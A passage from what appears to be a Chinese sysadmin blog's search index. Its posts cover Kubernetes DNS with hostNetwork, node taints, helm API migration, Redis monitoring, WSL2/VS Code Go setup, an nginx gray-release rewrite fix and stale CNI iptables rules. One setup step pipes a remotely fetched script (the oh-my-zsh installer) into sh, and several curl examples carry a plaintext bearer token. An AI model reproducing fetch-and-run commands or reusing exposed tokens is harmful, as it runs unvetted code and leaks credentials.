阿里云自己的slb对接的dcdn就不需要使用sni校验。\n","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-debug-tls-handshake/","tags":["kubernetes","dcdn"],"title":"记一次dcdn加apisix的sni报错。"},{"categories":["kubernetes"],"contents":"[TOC]\n 由于集群的kubernetes内网负载均衡和阿里云的SLB(loadblancer)存在bug. 详细请看这个知乎回答\n因此，我们采用pod的hostnetwork模式来常驻在两台ecs上做SLB的固定后端server。\n hostNetwork hostNetwork设置适用于Kubernetes pod。当pod配置为hostNetwork：true时，在此类pod中运行的应用程序可以直接查看启动pod的主机的网络接口。配置为侦听所有网络接口的应用程序，又可以在主机的所有网络接口上访问.\napiVersion: apps/v1 kind: Deployment metadata: name: nginx spec: template: metadata: labels: app: nginx spec: hostNetwork: true containers: - name: nginx image: nginx:1.7.9 ports: - containerPort: 80 这个刚好符合我们的策略。启动pod后，进入容器。 发现dns和我们的k8s集群的不对应。\nbash-5.0# nslookup prod-ngx-gw-svc.prod.svc.cluster.local Server:\t100.100.2.136 Address:\t100.100.2.136:53 ** server can't find prod-ngx-gw-svc.prod.svc.cluster.local: NXDOMAIN ** server can't find prod-ngx-gw-svc.prod.svc.cluster.local: NXDOMAIN bash-5.0# cat /etc/resolv.conf nameserver 100.100.2.136 nameserver 100.100.2.138 经过google后，在k8s官方网站查找得知pod的DNS策略。\nDNS 策略可以逐个 Pod 来设定。目前 Kubernetes 支持以下特定 Pod 的 DNS 策略。 这些策略可以在 Pod 规约中的 dnsPolicy 字段设置：\n \u0026ldquo;Default\u0026rdquo;: Pod 从运行所在的节点继承名称解析配置。 \u0026ldquo;ClusterFirst\u0026rdquo;: 与配置的集群域后缀不匹配的任何 DNS 查询（例如 \u0026ldquo;www.kubernetes.io\u0026rdquo;） 都将转发到从节点继承的上游名称服务器。集群管理员可能配置了额外的存根域和上游 DNS 服务器。 \u0026ldquo;ClusterFirstWithHostNet\u0026rdquo;：对于以 hostNetwork 方式运行的 Pod，应显式设置其 DNS 策略 \u0026ldquo;ClusterFirstWithHostNet\u0026rdquo;。 \u0026ldquo;None\u0026rdquo;: 此设置允许 Pod 忽略 Kubernetes 环境中的 DNS 设置。Pod 会使用其 dnsConfig 字段 所提供的 DNS 设置。。  因此在kubernetes集群使用 hostNetwork 时候， 需要添加dnsPolicy\napiVersion: apps/v1 kind: Deployment metadata: name: nginx spec: template: metadata: labels: app: nginx spec: hostNetwork: true dnsPolicy: ClusterFirstWithHostNet containers: - name: nginx image: nginx:1.7.9 ports: - containerPort: 80 再次进入容器。解析ok。\nbash-5.0# cat /etc/resolv.conf nameserver 172.19.0.10 search infras.svc.cluster.local svc.cluster.local cluster.local options ndots:5 bash-5.0# nslookup prod-ngx-gw-svc.prod.svc.cluster.local Server:\t172.19.0.10 Address:\t172.19.0.10:53 Name:\tprod-ngx-gw-svc.prod.svc.cluster.local Address: 172.19.9.7 记录一下。\n","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-dns-error-withhostnetwork/","tags":["kubernetes","helm"],"title":"记一次kubernetes使用hostnetwork网络相关问题及解决。"},{"categories":["kubernetes"],"contents":"[TOC]\n 调度器通过 kubernetes 的监测（Watch）机制来发现集群中新创建且尚未被调度到 Node 上的 Pod。 调度器会将发现的每一个未调度的 Pod 调度到一个合适的 Node 上来运行\n taint 和 tolerations 节点亲和性是 Pod 的一种属性，它使 Pod 被吸引到一类特定的节点。 这可能出于一种偏好，也可能是硬性要求。 Taint（污点）则相反，它使节点能够排斥一类特定的 Pod。\n容忍度（Tolerations）是应用于 Pod 上的，允许Pod 调度到带有与之匹配的污点的节点上。\n污点和容忍度（Toleration）相互配合，可以用来避免 Pod 被分配到不合适的节点上。\nnodeSelector nodeSelector 是节点选择约束的最简单推荐形式。nodeSelector 是 PodSpec 的一个字段。 它包含键值对的映射。为了使 pod 可以在某个节点上运行，该节点的标签中 必须包含这里的每个键值对（它也可以具有其他标签）。 最常见的用法的是一对键值对。\n场景 比如有以下场景。\n我有10台主机。 3master，7node。 其中3台用于production环境， 4台用于测试环境。区分策略如下：\n# taint kubectl taint nodes cn-hangzhou.i-bp1my group=non_prod:NoSchedule kubectl taint nodes cn-hangzhou.i-bp193 group=non_prod:NoSchedule kubectl taint nodes cn-hangzhou.i-bp151 group=non_prod:NoSchedule kubectl taint nodes cn-hangzhou.i-bp1bs group=non_prod:NoSchedule # label kubectl label node cn-hangzhou.i-bp1my env=non_prod kubectl label node cn-hangzhou.i-bp193 env=non_prod kubectl label node cn-hangzhou.i-bp151 env=non_prod kubectl label node cn-hangzhou.i-bp1bs env=non_prod 然后测试节点的deployment里面可以添加tolerations和nodeSelector。 即可保证调度的pod全部到env=non_prod组的node节点里面。\nnodeSelector: env: non_prod tolerations: - effect: NoSchedule key: group operator: Equal value: non_prod 生产标签和taint如下：\nkubectl taint nodes cn-hangzhou.i-bp001 group=prod:NoSchedule kubectl taint nodes cn-hangzhou.i-bp002 group=prod:NoSchedule kubectl taint nodes cn-hangzhou.i-bp003 group=prod:NoSchedule kubectl taint nodes cn-hangzhou.i-bp004 group=prod:NoSchedule # label kubectl label node cn-hangzhou.i-bp001 env=prod kubectl label node cn-hangzhou.i-bp002 env=prod kubectl label node cn-hangzhou.i-bp003 env=prod kubectl label node cn-hangzhou.i-bp004 env=prod 生产环境的deployment添加以下tolerations和nodeselector.\nnodeSelector: env: prod tolerations: - effect: NoSchedule key: group operator: Equal value: prod 简单记录一下。此套已经在生产环境运行2年了。\n","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-taints-tolerations/","tags":["kubernetes","taint"],"title":"kubernetes 调度策略"},{"categories":["kubernetes"],"contents":"[TOC]\n 由于集群的kubernetes从1.16版本升级到1.18版本。升级过程没什么大的问题， 只有一个--port=0的问题, 而且还是云监控的一个报错, 其他使用过程中没有什么报错. 因此可以忽略过去了\n还没多久, 我们需要更新线上版本, 发现了这个helm问题. 因此记录下来. 发版还是挺频繁的.\n 资源变更与弃用 Kubernetes 1.18版本中API相关弃用如下：\n 所有资源的API apps/v1beta1和apps/v1beta2都将弃用，请使用apps/v1代替。 Daemonsets/Deployments/Replicasets资源的API extensions/v1beta1将被弃用，请使用apps/v1代替。 Networkpolicies资源的API extensions/v1beta1将被弃用，请使用networking.k8s.io/v1代替。 Podsecuritypolicies资源的API extensions/v1beta1将被弃用，请使用policy/v1beta1代替。  Helm相关 我们线上的后端资源变更, 都是基于helm来做的. 集群从1.9.3慢慢升级到1.18.8的. 升级过程也比较坎坷. 而且是分步升级的. 因此有些资源用的都是比较老的版本, 比如我们的deployment用的就是apps/v1beta2 这个版本. 因此在执行helm upgrade的时候进行变更, 出现了以下的错误.\nError: UPGRADE FAILED: failed decoding reader into objects: unable to recognize \u0026quot;\u0026quot;: no matches for kind \u0026quot;Deployment\u0026quot; in version \u0026quot;apps/v1beta2\u0026quot; 而且我们用了三四年的集群, helm安装的deployment实在是太多, 有几百个. 每个release都是老的资源版本. 因此这个是一个比较紧急而且需要快速解决的问题. 网上调研了很多工具. 查了很多资料. 发现了一个很好用的工具. 具体helm/helm#6969. 遇到了这个问题的人还是很多的.\n生产环境重新安装release显然不是一个很好的选择, 如果没有灰度切换功能, 那么重新安装必然会影响整个发布系统.\n给出的文档有:\n v3: https://helm.sh/docs/topics/kubernetes_apis/ v2: https://v2.helm.sh/docs/using_helm/#deprecated-kubernetes-apis  相关的工具 https://github.com/hickeyma/helm-mapkubeapis.\n mapkubeapis is a Helm v2/v3 plugin which updates in-place Helm release metadata that contains deprecated or removed Kubernetes APIs to a new instance with supported Kubernetes APIs.\nCharts need to be updated also to supported Kubernetes APIs to avoid failure during deployment in a Kubernetes version. This is a separate task to the plugin.\n 稍微翻译一下就是:\n mapkubeapis 是helm的一个插件, 支持v2/v3. 主要是将kubernetes 已经弃用或者删除的api在helm release的元数据里面更新为kubernetes支持的api.\nhelm chart也需要同步更新到kubernetes支持的api, 才能避免在升级过程中发生的错误. 两种是分开的\n 完美解决 很简单的两条命令.\n$ helm plugin install https://github.com/hickeyma/helm-mapkubeapis # my-release-name 是helm-release 名称 # tiller-pod-namespace 是 tiller pod部署的namespace. 默认是 kube-system. $ helm mapkubeapis my-release-name --namespace tiller-pod-namespace --v2 升级过程的日志\n$ helm mapkubeapis be-payment-service-prod --namespace kube-system --v2 2021/03/30 15:10:22 Release 'be-payment-service-prod' will be checked for deprecated or removed Kubernetes APIs and will be updated if necessary to supported API versions. 2021/03/30 15:10:22 Get release 'be-payment-service-prod' latest version. 2021/03/30 15:10:23 Check release 'be-payment-service-prod' for deprecated or removed APIs... 2021/03/30 15:10:23 Found deprecated or removed Kubernetes API: \u0026quot;apiVersion: apps/v1beta2 kind: Deployment\u0026quot; Supported API equivalent: \u0026quot;apiVersion: apps/v1 kind: Deployment\u0026quot; 2021/03/30 15:10:23 Finished checking release 'be-payment-service-prod' for deprecated or removed APIs. 2021/03/30 15:10:23 Deprecated or removed APIs exist, updating release: be-payment-service-prod. 2021/03/30 15:10:23 Set status of release version 'be-payment-service-prod.v1' to 'superseded'. 2021/03/30 15:10:23 Release version 'be-payment-service-prod.v1' updated successfully. 2021/03/30 15:10:23 Add release version 'be-payment-service-prod.v2' with updated supported APIs. 2021/03/30 15:10:23 Release version 'be-payment-service-prod.v2' added successfully. 2021/03/30 15:10:23 Release 'be-payment-service-prod' with deprecated or removed APIs updated successfully to new version. 2021/03/30 15:10:23 Map of release 'be-payment-service-prod' deprecated or removed APIs to supported versions, completed successfully. ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-1.18-helm-upgrade-error/","tags":["kubernetes","helm"],"title":"记一次kubernetes升级1.18.8后的helm相关问题及解决。"},{"categories":["kubernetes"],"contents":"[TOC]\n 在使用数据库 Redis 过程中需要对 Redis 运行状态进行监控，以便了解 Redis 服务是否运行正常，排查 Redis 故障等。云监控 Prometheus 服务提供基于 Exporter 的方式来监控 Redis 运行状态，并提供了开箱即用的 Grafana 监控大盘。 正常的生产环境集群，redis都有N个集群。 因此搭建一个监控N给集群的redis成为了一个较为挑战的任务。\n 前提条件  创建了Prometheus。 创建了redis或者redis集群。  部署redis-exporter 直接给出redis的yaml配置文件. 如果是多个集群, 则依次添加即可.\napiVersion: apps/v1 kind: StatefulSet metadata: name: redis namespace: qa spec: podManagementPolicy: OrderedReady replicas: 1 revisionHistoryLimit: 10 selector: matchLabels: app: redis serviceName: redis template: metadata: creationTimestamp: null labels: app: redis spec: containers: - args: - /etc/redis/redis.conf env: - name: TZ value: Asia/Shanghai image: redis:5.0 imagePullPolicy: IfNotPresent name: redis ports: - containerPort: 6379 protocol: TCP terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /data name: redis-data - mountPath: /etc/redis/redis.conf name: redis-configmap subPath: redis.conf - name: redis-exporter env: - name: TZ value: Asia/Shanghai - name: REDIS_PASSWORD valueFrom: secretKeyRef: key: password name: redispasswd image: oliver006/redis_exporter:v1.15.1 ports: - containerPort: 9121 resources: requests: cpu: 100m memory: 100Mi dnsPolicy: ClusterFirst initContainers: - command: - /bin/sh - -c - echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled \u0026amp;\u0026amp; echo 65535 \u0026gt; /proc/sys/net/core/somaxconn \u0026amp;\u0026amp; sleep 1 image: busybox imagePullPolicy: Always name: disable-thp securityContext: privileged: true procMount: Default terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /sys name: sys nodeSelector: env: non_prod restartPolicy: Always schedulerName: default-scheduler terminationGracePeriodSeconds: 30 tolerations: - effect: NoSchedule key: group operator: Equal value: non_prod volumes: - configMap: defaultMode: 420 name: redis-redis.conf name: redis-configmap - hostPath: path: /sys name: sys updateStrategy: rollingUpdate: partition: 0 type: RollingUpdate volumeClaimTemplates: - metadata: creationTimestamp: null name: redis-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 5Gi storageClassName: alicloud-disk-common-hangzhou-b volumeMode: Filesystem status: phase: Pending service资源清单文件. 主要是在service里面添加annotations.\napiVersion: v1 kind: Service metadata: annotations: prometheus.io/scrape: \u0026#34;true\u0026#34; prometheus.io/port: \u0026#34;9121\u0026#34; name: redis-svc namespace: qa spec: clusterIP: None ports: - port: 6379 name: redis - name: prom port: 9121 targetPort: 9121 selector: app: redis redis 和 redis-exporter部署完毕后. 添加promethues的动态发现配置文件. 使用动态配置文件比静态的优势在于, 可以有多套集群.\n- job_name: \u0026#39;redis_exporter\u0026#39; kubernetes_sd_configs: - role: endpoints relabel_configs: - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scrape] action: keep regex: true - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_path] action: replace target_label: __metrics_path__ regex: (.+) - source_labels: [__address__, __meta_kubernetes_service_annotation_prometheus_io_port] action: replace regex: ([^:]+)(?::\\d+)?;(\\d+) replacement: $1:$2 target_label: __address__ - action: labelmap regex: __meta_kubernetes_pod_label_(.+) - source_labels: [__meta_kubernetes_namespace] action: replace regex: (redis.*) target_label: kubernetes_namespace - source_labels: [__meta_kubernetes_pod_name] action: keep regex: (.*redis.*) target_label: kubernetes_pod_name 这个时候显示的是endpoint的ip加上port. 在查看的时候其实是不大友好的. 可以用svc名字来代替.\n","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-prometheus-redis-exporter/","tags":["kubernetes","redis","prometheus"],"title":"k8s中Prometheus监控redis-exporter"},{"categories":["tools"],"contents":"[TOC]\n 背景: 提高开发效率, windows上使用linux开发. 并无缝使用vscode打开wls上文件. 真香开发.\n底层原理: vscode 的插件REMOTE-WSL插件安装.\n wls2安装, 直接查看官网即可, 非常简单wls2-install\nvscode安装. 去官网下载软件\nvscode插件安装  Visual Studio Code Remote - WSL, 核心插件. GitLens, git版本控制. go, 使用go开发. docker, 可不安装  配置wls2环境 # 配置golang $ wget https://golang.org/dl/go1.15.7.linux-amd64.tar.gz $ sudo tar xf go1.15.7.linux-amd64.tar.gz -C /usr/local ## 配置zsh. $ sudo apt install zsh $ sh -c \u0026quot;$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\u0026quot; ## 强烈推荐ys主题. $ vi ~/.zshrc ZSH_THEME=\u0026quot;ys\u0026quot; 配置go开发环境 启动wls2和vscdoe后. 进入 $HOME/.vscode-server/data/Machine . 配置settings.json, 我这边$HOME=/home/louis.\n{ \u0026#34;terminal.integrated.shell.linux\u0026#34;: \u0026#34;/usr/bin/zsh\u0026#34;, \u0026#34;go.gopath\u0026#34;: \u0026#34;$HOME/go\u0026#34;, \u0026#34;go.goroot\u0026#34;: \u0026#34;/usr/local/go\u0026#34;, \u0026#34;go.formatTool\u0026#34;: \u0026#34;goformat\u0026#34;, \u0026#34;go.autocompleteUnimportedPackages\u0026#34;: true, \u0026#34;go.testFlags\u0026#34;: [\u0026#34;-v\u0026#34;], \u0026#34;[go]\u0026#34;: { \u0026#34;editor.formatOnSave\u0026#34;: true, \u0026#34;editor.codeActionsOnSave\u0026#34;: { \u0026#34;source.organizeImports\u0026#34;: true } } } 真香开发.\nps: 今天是破壳日. 偶然无事来写写文章.\n","permalink":"https://www.fenghong.tech/blog/tools/windows-wls2-vscode-go/","tags":["golang","vscode"],"title":"windos使用wls2 并配置vscode golang开发~"},{"categories":["ops"],"contents":"[TOC]\n背景  偶然有一次机会使用nginx做灰度发布. 想到了nginx的map的功能, 于是使用map进行设置变量. 由于设置变量匹配后, 在反向代理过程中, 会丢失部分的$args及重写的$1/$2等自定义的参数. 这篇博客便是记录一下自己的解决方法.\n 灰度发布（又名金丝雀发布，英文一般称为GrayRelease或Dark launch）是为了能够让用户逐步过渡到新功能一种发布方式。 一般是产品上线一个功能，希望在线上可以进行A/B testing，即让一部分用户继续用产品特性A，一部分用户开始用产品特性B，如果用户对B没有什么反对意见，那么逐步扩大范围，把所有用户都迁移到B上面来。\n我这边采用基于HEADER分流策略\n 获取灰度标识，使用的是$http_version（即$http_header名）的写法；  采用map来实现\nmap $http_version $group_staging_be_gateway_service { ~^v2$ staging_be_gateway_service_svr_v2; default staging_be_gateway_service_svr; } upstream staging_be_gateway_service_svr { dynamic_resolve fallback=stale fail_timeout=30s; server be-gateway-service.staging.svc.cluster.local:8000; keepalive 512; } upstream staging_be_gateway_service_svr_v2 { dynamic_resolve fallback=stale fail_timeout=30s; server be-gateway-service-v2.staging.svc.cluster.local:8001; keepalive 512; } server { listen 80; server_name api.fenghong.tech; location ~ ^/v1/(.+)$ { # add_header Access-Control-Allow-Origin *; # add_header access-control-allow-methods \u0026#34;GET,PUT,POST,DELETE\u0026#34;; proxy_set_header Host $host; # 添加http1.1声明和header中connection重写 proxy_http_version 1.1; proxy_set_header Connection \u0026#34;\u0026#34;; proxy_pass http://$group_staging_be_gateway_service/__api/$1?$args; } } 问题描述 使用上述这套配置后. 进行api访问. 直接加入header version: v2 模拟灰度访问. 发现 $1和$args全部丢失.\n# louis @ LAPTOP-I2BJS52K in ~ [15:22:48] $ curl \u0026#39;https://api.fenghong.tech/v1/crm/member/agent_area/2/mappedByDistrictCode?contractId=1039\u0026#39; -H \u0026#39;version: v2\u0026#39; \\ \u0026gt; -H \u0026#39;authority: api.fenghong.tech\u0026#39; \\ \u0026gt; -H \u0026#39;accept: application/json, text/plain, */*\u0026#39; \\ \u0026gt; -H \u0026#39;authorization: Bearer 3799fd1e-74e2-3b92-a109-52b32d3b8026\u0026#39; \\ \u0026gt; -H \u0026#39;user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\u0026#39; \\ \u0026gt; -H \u0026#39;content-type: application/json;charset=UTF-8\u0026#39; \\ \u0026gt; -H \u0026#39;origin: https://www.fenghong.tech\u0026#39; \\ \u0026gt; -H \u0026#39;sec-fetch-site: cross-site\u0026#39; \\ \u0026gt; -H \u0026#39;sec-fetch-mode: cors\u0026#39; \\ \u0026gt; -H \u0026#39;sec-fetch-dest: empty\u0026#39; \\ \u0026gt; -H \u0026#39;referer: https://www.fenghong.tech/\u0026#39; \\ \u0026gt; -H \u0026#39;accept-language: zh-CN,zh;q=0.9\u0026#39; \\ \u0026gt; --data-binary \u0026#39;[440203]\u0026#39; \\ \u0026gt; --compressed {\u0026#34;timestamp\u0026#34;:\u0026#34;2020-12-29T07:22:48.541+0000\u0026#34;,\u0026#34;status\u0026#34;:404,\u0026#34;error\u0026#34;:\u0026#34;Not Found\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;No message available\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/__api/\u0026#34;} 模拟正常访问去掉version: v2 这个header, 即进入正常访问, 这个时候配置居然没有丢失 $1和$args. 很纳闷.\n# louis @ LAPTOP-I2BJS52K in ~ [15:25:48] $ curl 'https://api.fenghong.tech/v1/crm/member/agent_area/2/mappedByDistrictCode?contractId=1039' \\ -H 'authority: api.fenghong.tech' \\ -H 'accept: application/json, text/plain, */*' \\ -H 'authorization: Bearer 3799fd1e-74e2-3b92-a109-52b32d3b8026' \\ -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' \\ -H 'content-type: application/json;charset=UTF-8' \\ -H 'origin: https://www.fenghong.tech' \\ -H 'sec-fetch-site: cross-site' \\ -H 'sec-fetch-mode: cors' \\ -H 'sec-fetch-dest: empty' \\ -H 'referer: https://www.fenghong.tech/' \\ -H 'accept-language: zh-CN,zh;q=0.9' \\ --data-binary '[440203]' \\ --compressed {\u0026quot;code\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;success\u0026quot;,\u0026quot;data\u0026quot;:{\u0026quot;440203\u0026quot;:null}} 在预发布环境测试出来后, 要解决这个问题, 得重新写策略来匹配.\n方案一 使用rewrite last, 这个会导致多请求一次匹配. 性能原始的proxy_pass稍低. 关于nginx的 rewrite策略的last. 我以前写过一篇文章. 建议可以看看nginx rewrite的break和last\nlocation ~ ^/v1/(.+)$ { # add_header Access-Control-Allow-Origin *; # add_header access-control-allow-methods \u0026#34;GET,PUT,POST,DELETE\u0026#34;; proxy_set_header Host $host; # 添加http1.1声明和header中connection重写 proxy_http_version 1.1; proxy_set_header Connection \u0026#34;\u0026#34;; # 重写后去匹配 location ~ ^/__api {} 相关策略. rewrite ^/v1/(.*)$ /__api/$1?$args last; #proxy_pass http://$group_staging_be_gateway_service/__api/$1?$args; } 使用这个配置之后. 灰度环境, 访问立即正常.\n# louis @ LAPTOP-I2BJS52K in ~ [15:28:48] $ curl \u0026#39;https://api.fenghong.tech/v1/crm/member/agent_area/2/mappedByDistrictCode?contractId=1039\u0026#39; -H \u0026#39;version: v2\u0026#39; \\  -H \u0026#39;authority: api.fenghong.tech\u0026#39; \\  -H \u0026#39;accept: application/json, text/plain, */*\u0026#39; \\  -H \u0026#39;authorization: Bearer 3799fd1e-74e2-3b92-a109-52b32d3b8026\u0026#39; \\  -H \u0026#39;user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\u0026#39; \\  -H \u0026#39;content-type: application/json;charset=UTF-8\u0026#39; \\  -H \u0026#39;origin: https://www.fenghong.tech\u0026#39; \\  -H \u0026#39;sec-fetch-site: cross-site\u0026#39; \\  -H \u0026#39;sec-fetch-mode: cors\u0026#39; \\  -H \u0026#39;sec-fetch-dest: empty\u0026#39; \\  -H \u0026#39;referer: https://www.fenghong.tech/\u0026#39; \\  -H \u0026#39;accept-language: zh-CN,zh;q=0.9\u0026#39; \\  --data-binary \u0026#39;[440203]\u0026#39; \\  --compressed {\u0026#34;code\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;success\u0026#34;,\u0026#34;data\u0026#34;:{\u0026#34;440203\u0026#34;:null}} 方案二 使用rewrite break , 直接请求proxy_pass.\n location ~ ^/v1/(.+)$ { # add_header Access-Control-Allow-Origin *; # add_header access-control-allow-methods \u0026quot;GET,PUT,POST,DELETE\u0026quot;; proxy_set_header Host $host; # 添加http1.1声明和header中connection重写 proxy_http_version 1.1; proxy_set_header Connection \u0026quot;\u0026quot;; #重写后, 立即break, 然后进入 proxy_pass rewrite ^/v1/(.*)$ /__api/$1?$args break; proxy_pass http://$group_staging_be_gateway_service; } 请求示例\n# louis @ LAPTOP-I2BJS52K in ~ [15:31:40] $ curl 'https://api.fenghong.tech/v1/crm/member/agent_area/2/mappedByDistrictCode?contractId=1039' -H 'version: v2' \\ -H 'authority: api.fenghong.tech' \\ -H 'accept: application/json, text/plain, */*' \\ -H 'authorization: Bearer 3799fd1e-74e2-3b92-a109-52b32d3b8026' \\ -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' \\ -H 'content-type: application/json;charset=UTF-8' \\ -H 'origin: https://www.fenghong.tech' \\ -H 'sec-fetch-site: cross-site' \\ -H 'sec-fetch-mode: cors' \\ -H 'sec-fetch-dest: empty' \\ -H 'referer: https://www.fenghong.tech/' \\ -H 'accept-language: zh-CN,zh;q=0.9' \\ --data-binary '[440203]' \\ --compressed {\u0026quot;code\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;message\u0026quot;:\u0026quot;success\u0026quot;,\u0026quot;data\u0026quot;:{\u0026quot;440203\u0026quot;:null}} 显然. 方案二比方案一更加优化. 因此, 我选择方案二作为线上版本.\n总结 这三种配置, 在不加入header version: v2的情况下. 使用curl访问都不会丢失 $1和$args. 只有在加入header version: v2的情况下, 原始配置会丢 $1和$args. 方案一和方案二的配置不会丢失 $1和$args.\n参考文档  http://nginx.org/en/docs/http/ngx_http_rewrite_module.html  ","permalink":"https://www.fenghong.tech/blog/ops/nginx-map-args/","tags":["nginx","map"],"title":"记一次nginx使用map后的uri丢失"},{"categories":["kubernetes"],"contents":"[TOC]\n 安装kubenetes1.18.7集群后，一次异常重启后， 在集群内访问ingress失败， 这篇文章仅记录处理问题过程。\n kubernetes集群搭建  系统环境: Ubuntu 18.04.     主机名 IP地址     master0 192.168.0.118   master1 192.168.0.119   master2 192.168.0.26   server22 192.168.0.20   server500 192.168.0.24    我们生产环境, 采用sealos一键快速部署集群.\n$ sealos init --master 192.168.0.118 \\ \t--master 192.168.0.119 \\ \t--master 192.168.0.26 \\ \t--node 192.168.0.20 \\ \t--node 192.168.0.24 \\  --pkg-url /root/kube1.18.7.tar.gz \\ \t--version v1.18.7 \\ \t--passwd ubuntu --user root ingress是使用官方的nginx-ingress, 默认是daemonst + hostnetwork.\n$ kubectl apply -f https://kuboard.cn/install-script/v1.15.2/nginx-ingress.yaml 问题发现, 查看ingress后, 发现server22上面的ingress pod始终无法访问 , 导致对于的宿主机也无法访问其80端口.\nroot@ubuntu:~# kubectl get pod -n nginx-ingress -owide NAME READY STATUS RESTARTS AGE IP NODE nginx-ingress-ndxd9 1/1 Running 0 79m 10.1.117.216 server22 nginx-ingress-xw5bb 1/1 Running 0 25d 10.1.220.194 server500 在server22上, 发现一直hang在那里.\n$ curl 127.0.0.1 在server500 上\nroot@ubuntu:~# curl 127.0.0.1 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;404 Not Found\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.17.3\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 排查思路 基于hostNetwork网络实现的对外暴露端口, 其本质就是iptables的DNAT. 一开始业务人员反映是svc访问不了, 导致整个排除进入ipvs的排错. 经过定位, 才发现是宿主机到ingress的pod网络不通.\n以下是简便的步骤.\ningress主机是暴露80端口, 所以查找关键字80即可. 这里可以看到, 到pod的网段10.1.117.194的流量全部到CNI-DN-a2617edac93cc96942325这条自定义规则上, 而且生成了三类规则. 其中有两条是重复的, 一条是新的.\n$ iptables-save |grep -w 80 -A CNI-DN-0405c966411786b4a6079 -s 10.1.117.194/32 -p tcp -m tcp --dport 80 -j CNI-HOSTPORT-SETMARK -A CNI-DN-0405c966411786b4a6079 -s 127.0.0.1/32 -p tcp -m tcp --dport 80 -j CNI-HOSTPORT-SETMARK -A CNI-DN-0405c966411786b4a6079 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.117.194:80 -A CNI-DN-9c176252e9af1b9ec0d79 -s 10.1.117.216/32 -p tcp -m tcp --dport 80 -j CNI-HOSTPORT-SETMARK -A CNI-DN-9c176252e9af1b9ec0d79 -s 127.0.0.1/32 -p tcp -m tcp --dport 80 -j CNI-HOSTPORT-SETMARK -A CNI-DN-9c176252e9af1b9ec0d79 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.117.216:80 : 也就是这三条规则. 10.1.117.194 这个ip的pod已经被销毁了, 所以访问注定就不成功 -A CNI-DN-a2617edac93cc96942325 -s 10.1.117.194/32 -p tcp -m tcp --dport 80 -j CNI-HOSTPORT-SETMARK -A CNI-DN-a2617edac93cc96942325 -s 127.0.0.1/32 -p tcp -m tcp --dport 80 -j CNI-HOSTPORT-SETMARK -A CNI-DN-a2617edac93cc96942325 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.117.194:80 : 其实真正生效的就是这个规则, iptables的优先匹配. -A CNI-HOSTPORT-DNAT -p tcp -m comment --comment \u0026#34;dnat name: \\\u0026#34;k8s-pod-network\\\u0026#34; id: \\\u0026#34;67a31caecdf4bd8f176f3935263e4a3b309f56b0f2b25bb05352dc67de463cea\\\u0026#34;\u0026#34; -m multiport --dports 80,443 -j CNI-DN-a2617edac93cc96942325 -A CNI-HOSTPORT-DNAT -p tcp -m comment --comment \u0026#34;dnat name: \\\u0026#34;k8s-pod-network\\\u0026#34; id: \\\u0026#34;1305c56a786475d02cec2ddea98d3445bf8329fe6de5ac5adcb203f5932f8bfd\\\u0026#34;\u0026#34; -m multiport --dports 80,443 -j CNI-DN-0405c966411786b4a6079 -A CNI-HOSTPORT-DNAT -p tcp -m comment --comment \u0026#34;dnat name: \\\u0026#34;k8s-pod-network\\\u0026#34; id: \\\u0026#34;8b83153a6c417bcf7f5a5f73d1725593c318b6afc807ff93b40f1caf76b21051\\\u0026#34;\u0026#34; -m multiport --dports 80,443 -j CNI-DN-9c176252e9af1b9ec0d79 纵观其他主机server500的规则. 只有一条CNI-HOSTPORT-DNAT\n-A CNI-HOSTPORT-DNAT -p tcp -m comment --comment \u0026#34;dnat name: \\\u0026#34;k8s-pod-network\\\u0026#34; id: \\\u0026#34;4d3b483f886a775ce60fc3482c308aea1a5ba0b876ca8126a02562cf29ade9a2\\\u0026#34;\u0026#34; -m multiport --dports 80,443 -j CNI-DN-4d0339c362ca90c577adb 对比后, 很明显的发现, 10.1.117.194这个是老pod的ip. 应该是这个pod生命周期消失后, iptables规则没有自动去除, 新生成的10.1.117.216pod的iptables规则添加后, 又被覆盖.\n解决 知道了问题所在, 那么解决方法也很简单\n$ iptables-save \u0026gt; iptables.20201215 ## 删除无用的规则. $ sed -i '/CNI-DN-a2617edac93cc96942325/d' iptables.20201215 $ sed -i '/CNI-DN-0405c966411786b4a6079/d' iptables.20201215 $ iptables-restore \u0026lt; iptables.20201215 